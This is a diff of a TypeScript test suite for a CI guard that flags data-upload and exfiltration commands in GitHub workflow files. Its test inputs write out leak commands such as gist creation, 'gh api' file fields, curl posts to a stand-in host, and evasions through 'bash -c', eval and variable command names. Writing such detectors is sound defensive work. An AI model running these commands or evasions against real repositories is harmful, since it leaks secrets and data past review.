@@ -45,8 +45,16 @@ function runYaml(cmd: string) {
   return `run: ${JSON.stringify(cmd)}\n`;
 }
 
-function releasePublishYaml(createLine: string, assign = "NOTES=$(cat RELEASE_NOTES.md)") {
-  return ["run: |", `  ${assign}`, `  ${createLine}`, ""].join("\n");
+const PINNED_PUBLISH = [
+  'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
+  'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
+  'STABLE_DMG="Nuvo.dmg"',
+  "NOTES=$(cat RELEASE_NOTES.md)",
+];
+
+function releasePublishYaml(createLine: string, assigns: string | string[] = PINNED_PUBLISH) {
+  const lines = Array.isArray(assigns) ? assigns : [assigns];
+  return ["run: |", ...lines.map((a) => `  ${a}`), `  ${createLine}`, ""].join("\n");
 }
 
 const DESKTOP_CREATE =
@@ -172,15 +180,15 @@ describe("public-repo CI guard", () => {
     expect(findForbiddenUploadCommands(runYaml("gh gist create secret.dump"))).toEqual([
       { line: 1, kind: "gh gist create" },
     ]);
-    expect(findForbiddenUploadCommands(runYaml("gh api -F x=@file repos/o/r"))).toEqual([
-      { line: 1, kind: "gh @file" },
-    ]);
-    expect(findForbiddenUploadCommands(runYaml("gh api -f x=@file repos/o/r"))).toEqual([
-      { line: 1, kind: "gh @file" },
-    ]);
-    expect(findForbiddenUploadCommands(runYaml('gh api -F "x=@file" repos/o/r'))).toEqual([
-      { line: 1, kind: "gh @file" },
-    ]);
+    expect(findForbiddenUploadCommands(runYaml("gh api -F x=@file repos/o/r")).map((h) => h.kind)).toEqual(
+      expect.arrayContaining(["gh @file", "gh api field"]),
+    );
+    expect(findForbiddenUploadCommands(runYaml("gh api -f x=@file repos/o/r")).map((h) => h.kind)).toEqual(
+      expect.arrayContaining(["gh @file", "gh api field"]),
+    );
+    expect(findForbiddenUploadCommands(runYaml('gh api -F "x=@file" repos/o/r')).map((h) => h.kind)).toEqual(
+      expect.arrayContaining(["gh @file", "gh api field"]),
+    );
     expect(() =>
       assertWorkflowUploadAllowlist(
         "uses: ncipollo/release-action@v1\nwith:\n  artifacts: secret.dump\n",
@@ -205,11 +213,17 @@ describe("public-repo CI guard", () => {
     const desktopPublish = releasePublishYaml(DESKTOP_CREATE);
     expect(findForbiddenUploadCommands(desktopPublish, "release.yml")).toEqual([]);
     expect(findForbiddenUploadCommands(desktopPublish, "cutover-migrate.yml")).toEqual([
-      { line: 2, kind: "gh release create" },
+      { line: 5, kind: "gh release create" },
     ]);
-    expect(findForbiddenUploadCommands(runYaml("gh api repos/o/r --method PUT --field content=$CONTENT"))).toEqual(
-      [],
-    );
+    expect(
+      findForbiddenUploadCommands(runYaml("gh api repos/o/r --method PUT --field content=$CONTENT")),
+    ).toEqual([{ line: 1, kind: "gh api field" }]);
+    expect(
+      findForbiddenUploadCommands(
+        runYaml("gh api repos/o/r --method PUT --field content=$CONTENT"),
+        "release.yml",
+      ),
+    ).toEqual([]);
   });
 
   it("rejects gh api --input, action-gh-release, and cache save", () => {
@@ -302,9 +316,9 @@ describe("public-repo CI guard", () => {
     expect(lineLooksLikeHttpUpload("`curl` -d @f https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("env curl -d @f https://example.com")).toBe(true);
     expect(lineLooksLikeHttpUpload("command curl -d @f https://example.com")).toBe(true);
-    expect(findForbiddenUploadCommands(runYaml("$(which curl) -d @f https://example.com"))).toEqual([
-      { line: 1, kind: "curl/wget upload" },
-    ]);
+    expect(findForbiddenUploadCommands(runYaml("$(which curl) -d @f https://example.com")).map((h) => h.kind)).toEqual(
+      expect.arrayContaining(["curl/wget upload", "dirty command"]),
+    );
     expect(findForbiddenUploadCommands(runYaml("command gh gist create secret.dump"))).toEqual([
       { line: 1, kind: "gh gist create" },
     ]);
@@ -452,6 +466,107 @@ describe("public-repo CI guard", () => {
     ).toContain("NOTES assignment");
   });
 
+  it("rejects interpolated gh api -f/-F/--field/--raw-field values and -F/--input @file", () => {
+    const leaks = [
+      'gh api repos/o/r -f body="$(cat dump.sql)"',
+      "gh api repos/o/r -F body=@dump.sql",
+      "gh api repos/o/r --raw-field content=$DUMP",
+      "gh api repos/o/r --field=content=$DUMP",
+      "gh api repos/o/r -fbody=$DUMP",
+      "DUMP=$(cat dump.sql); gh api repos/o/r -f body=$DUMP",
+      "gh api repos/o/r --input @dump.sql",
+    ];
+    for (const cmd of leaks) {
+      expect(findForbiddenUploadCommands(runYaml(cmd)).map((h) => h.kind), cmd).toEqual(
+        expect.arrayContaining([
+          expect.stringMatching(/gh api field|gh api --input|gh @file/),
+        ]),
+      );
+    }
+    expect(
+      findForbiddenUploadCommands(
+        runYaml('gh api repos/o/r --field "content=$CONTENT" --field "sha=$FILE_SHA"'),
+        "release.yml",
+      ),
+    ).toEqual([]);
+  });
+
+  it("rejects bash -c, sh -c, any shell -c, and eval that hide gh", () => {
+    expect(findForbiddenUploadCommands(runYaml("bash -c 'gh gist create dump.sql'")).map((h) => h.kind)).toContain(
+      "shell -c",
+    );
+    expect(findForbiddenUploadCommands(runYaml('sh -c "gh api -f body=$(cat dump)"')).map((h) => h.kind)).toContain(
+      "shell -c",
+    );
+    expect(findForbiddenUploadCommands(runYaml("zsh -c 'gh release create v1 dump.sql'")).map((h) => h.kind)).toContain(
+      "shell -c",
+    );
+    expect(findForbiddenUploadCommands(runYaml('eval "gh gist create dump.sql"')).map((h) => h.kind)).toContain("eval");
+    expect(findForbiddenUploadCommands(runYaml('bash -c "$CMD"')).map((h) => h.kind)).toContain("shell -c");
+    expect(findForbiddenUploadCommands(runYaml("bash -c 'echo ok'"))).toEqual([]);
+  });
+
+  it("rejects backslashes, quotes, and $ / ${} / $(...) in command position", () => {
+    expect(findForbiddenUploadCommands(runYaml("$G gist create dump.sql")).map((h) => h.kind)).toContain(
+      "dirty command",
+    );
+    expect(findForbiddenUploadCommands(runYaml("${G} api -f body=@dump.sql")).map((h) => h.kind)).toContain(
+      "dirty command",
+    );
+    expect(findForbiddenUploadCommands(runYaml("$(which gh) gist create dump.sql")).map((h) => h.kind)).toContain(
+      "dirty command",
+    );
+    expect(findForbiddenUploadCommands(runYaml("\\gh gist create dump.sql")).map((h) => h.kind)).toContain(
+      "dirty command",
+    );
+    expect(findForbiddenUploadCommands(runYaml('"gh" gist create dump.sql')).map((h) => h.kind)).toContain(
+      "dirty command",
+    );
+  });
+
+  it("denies gh alias set and gh alias import everywhere", () => {
+    expect(findForbiddenUploadCommands(runYaml("gh alias set leak 'pr create --title t'"))).toEqual([
+      { line: 1, kind: "gh alias" },
+    ]);
+    expect(findForbiddenUploadCommands(runYaml("gh alias import aliases.yml"), "release.yml")).toEqual([
+      { line: 1, kind: "gh alias" },
+    ]);
+    expect(() => assertWorkflowUploadAllowlist(runYaml("gh alias set x 'pr create'"), "alias.yml")).toThrow(
+      /gh alias/,
+    );
+  });
+
+  it("pins exactly one DMG/STABLE_DMG/APPTAR/NOTES assignment in the release step", () => {
+    expect(findForbiddenUploadCommands(releasePublishYaml(DESKTOP_CREATE), "release.yml")).toEqual([]);
+    const reassign = releasePublishYaml(DESKTOP_CREATE, [
+      ...PINNED_PUBLISH,
+      'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
+    ]);
+    expect(findForbiddenUploadCommands(reassign, "release.yml").map((h) => h.kind)).toContain("DMG assignment");
+    expect(
+      findForbiddenUploadCommands(
+        releasePublishYaml(DESKTOP_CREATE, [
+          'DMG=/tmp/dump.dmg',
+          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
+          'STABLE_DMG="Nuvo.dmg"',
+          "NOTES=$(cat RELEASE_NOTES.md)",
+        ]),
+        "release.yml",
+      ).map((h) => h.kind),
+    ).toContain("DMG assignment");
+    expect(
+      findForbiddenUploadCommands(
+        releasePublishYaml(DESKTOP_CREATE, [
+          'DMG=$(ls "$BUNDLE"/dmg/*.dmg | head -1)',
+          'APPTAR=$(ls "$BUNDLE"/macos/*.app.tar.gz | head -1)',
+          'STABLE_DMG="other.dmg"',
+          "NOTES=$(cat RELEASE_NOTES.md)",
+        ]),
+        "release.yml",
+      ).map((h) => h.kind),
+    ).toContain("STABLE_DMG assignment");
+  });
+
   it("pins yaml at exactly 2.9.1", () => {
     const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
     expect(pkg.devDependencies.yaml).toBe("2.9.1");
@@ -462,11 +577,15 @@ describe("public-repo CI guard", () => {
     expect(src).toMatch(/## Limits/);
     expect(src).toMatch(/actions\/github-script/);
     expect(src).toMatch(/Python or Node/);
+    expect(src).toMatch(/non-`gh` exfil/);
+    expect(src).toMatch(/`nc`/);
     expect(src).toMatch(/Reviewers must check those paths by hand/);
     const doc = readFileSync(join(ROOT, "docs/cloudflare-cutover.md"), "utf8");
     expect(doc).toMatch(/### Limits/);
     expect(doc).toMatch(/actions\/github-script/);
     expect(doc).toMatch(/Python or Node/);
+    expect(doc).toMatch(/non-`gh` exfil/);
+    expect(doc).toMatch(/`nc`/);
   });
 
   it("rejects a multi-path dump + hash upload", () => {
